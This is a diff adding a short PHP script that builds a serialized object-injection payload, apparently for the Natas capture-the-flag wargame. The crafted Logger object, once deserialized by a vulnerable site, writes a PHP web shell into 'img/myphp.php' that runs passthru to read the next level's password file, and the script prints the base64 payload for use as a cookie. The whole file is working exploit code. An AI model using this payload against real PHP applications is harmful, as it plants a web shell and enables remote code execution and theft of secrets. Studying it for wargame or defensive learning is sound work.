@@ -1,0 +1,31 @@
+<?php
+  class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file){
+      $this->initMsg="";
+      $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27') ?>";
+      $this->logFile = "img/myphp.php";
+
+      $fd=fopen($this->logFile,"a+");
+      fwrite($fd,$this->initMsg);
+      fclose($fd);
+    }
+
+    function log($msg){
+      $fd=fopen($this->logFile,"a+");
+      fwrite($fd,$msg."\n");
+      fclose($fd);
+    }
+
+    function __destruct(){
+      $fd=fopen($this->logFile,"a+");
+      fwrite($fd,$this->exitMsg);
+      fclose($fd);
+    }
+  }
+
+  print base64_encode(serialize(new Logger('')));
+?>
